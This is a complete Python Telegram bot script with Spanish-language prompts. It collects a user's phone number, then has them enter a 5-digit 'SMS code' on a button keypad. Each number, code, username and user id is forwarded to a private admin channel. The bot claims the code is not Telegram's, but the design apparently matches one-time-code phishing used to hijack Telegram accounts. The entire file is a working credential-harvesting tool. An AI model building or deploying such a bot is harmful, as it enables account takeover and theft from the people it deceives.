import os
import logging
from datetime import datetime
from telegram import (
    Update, KeyboardButton, ReplyKeyboardMarkup,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# ========= Config =========
BOT_TOKEN = os.getenv("BOT_TOKEN")  # Token de @BotFather
ADMIN_CHANNEL_ID = int(os.getenv("ADMIN_CHANNEL_ID", "0"))  # p. ej. -1001234567890 (bot debe ser admin)

# ========= Logging =========
logging.basicConfig(level=logging.INFO)
log = logging.getLogger("verify-bot")

# ========= Claves user_data =========
UD_PHONE = "phone"
UD_CODE = "code"  # buffer de dígitos introducidos

def build_share_phone_kb():
    btn = KeyboardButton("📲 Compartir mi número (recomendado)", request_contact=True)
    return ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)

def build_keypad(code_str: str):
    rows = [
        [InlineKeyboardButton("1", callback_data="d:1"),
         InlineKeyboardButton("2", callback_data="d:2"),
         InlineKeyboardButton("3", callback_data="d:3")],
        [InlineKeyboardButton("4", callback_data="d:4"),
         InlineKeyboardButton("5", callback_data="d:5"),
         InlineKeyboardButton("6", callback_data="d:6")],
        [InlineKeyboardButton("7", callback_data="d:7"),
         InlineKeyboardButton("8", callback_data="d:8"),
         InlineKeyboardButton("9", callback_data="d:9")],
        [InlineKeyboardButton("← Borrar", callback_data="del"),
         InlineKeyboardButton("0", callback_data="d:0"),
         InlineKeyboardButton("✅ Confirmar", callback_data="ok")],
        [InlineKeyboardButton("❌ Cancelar", callback_data="cancel")]
    ]
    # Mostrar progreso (p. ej. • • • • •)
    progress = " ".join(list(code_str)) if code_str else "—"
    text = (
        "🔐 *Verificación por SMS (no es de Telegram)*\n"
        "Introduce el *código de 5 dígitos* que te enviamos por *SMS* y luego toca *Confirmar*.\n\n"
        f"Código: `{progress}`"
    )
    return text, InlineKeyboardMarkup(rows)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Limpia estado del usuario
    context.user_data[UD_CODE] = ""
    context.user_data.pop(UD_PHONE, None)

    await update.message.reply_text(
        "Hola 👋\n"
        "Para continuar, comparte tu número con el botón de abajo.\n\n"
        "🔎 *Importante*: esto NO es verificación de Telegram. Es un código propio que te enviaremos por *SMS*.",
        reply_markup=build_share_phone_kb(),
        parse_mode="Markdown"
    )

async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.contact:
        return

    phone = update.message.contact.phone_number
    context.user_data[UD_PHONE] = phone
    context.user_data[UD_CODE] = ""

    # Aviso al canal privado
    user = update.effective_user
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    admin_text = (
        f"📥 *Nuevo número recibido*\n"
        f"- Teléfono: `{phone}`\n"
        f"- Usuario: @{user.username or 'sin_username'} (id {user.id})\n"
        f"- Fecha/Hora: {stamp}"
    )
    if ADMIN_CHANNEL_ID:
        await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")

    # Enviar el teclado numérico para introducir el código SMS (tú se lo mandas por SMS aparte)
    msg, kb = build_keypad(context.user_data[UD_CODE])
    await update.message.reply_text(
        "✅ Número recibido correctamente.\n\n"
        "Ahora introduce el *código de 5 dígitos* que te enviamos por *SMS*.",
        parse_mode="Markdown"
    )
    await update.message.reply_text(msg, reply_markup=kb, parse_mode="Markdown")

async def trigger_manual(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Si el usuario escribe cualquier texto y ya tenemos teléfono, mostramos el keypad otra vez
    phone = context.user_data.get(UD_PHONE)
    if not phone:
        await update.message.reply_text(
            "Primero comparte tu número con el botón nativo, por favor.",
            reply_markup=build_share_phone_kb()
        )
        return
    msg, kb = build_keypad(context.user_data.get(UD_CODE, ""))
    await update.message.reply_text(msg, reply_markup=kb, parse_mode="Markdown")

async def keypad_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not q:
        return
    await q.answer()

    code = context.user_data.get(UD_CODE, "")
    data = q.data or ""

    if data.startswith("d:"):
        if len(code) < 5:
            code += data.split(":")[1]
    elif data == "del":
        code = code[:-1]
    elif data == "cancel":
        context.user_data[UD_CODE] = ""
        await q.edit_message_text("Operación cancelada. Si quieres reintentar, escribe cualquier cosa.")
        return
    elif data == "ok":
        phone = context.user_data.get(UD_PHONE, "desconocido")
        user = update.effective_user
        # Enviar al canal privado para tu revisión manual
        stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        admin_text = (
            f"🧩 *Código ingresado por el cliente*\n"
            f"- Teléfono: `{phone}`\n"
            f"- Código (SMS externo): `{code}`\n"
            f"- Usuario: @{user.username or 'sin_username'} (id {user.id})\n"
            f"- Fecha/Hora: {stamp}"
        )
        if ADMIN_CHANNEL_ID:
            await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")

        await q.edit_message_text("✅ ¡Gracias! Hemos recibido tu código. Te confirmaremos en breve.")
        # Limpieza opcional
        context.user_data[UD_CODE] = ""
        return

    context.user_data[UD_CODE] = code
    msg, kb = build_keypad(code)
    # Actualizar el mensaje con el progreso
    try:
        await q.edit_message_text(msg, reply_markup=kb, parse_mode="Markdown")
    except Exception as e:
        log.warning("No se pudo editar el mensaje: %s", e)
        try:
            await q.message.edit_reply_markup(reply_markup=kb)
        except Exception:
            pass

def main():
    if not BOT_TOKEN:
        raise RuntimeError("Falta BOT_TOKEN en variables de entorno")
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, on_contact))
    # Si el usuario escribe algo, re-mostramos el keypad (si ya compartió número)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, trigger_manual))
    app.add_handler(CallbackQueryHandler(keypad_handler))

    app.run_polling()

if __name__ == "__main__":
    main()
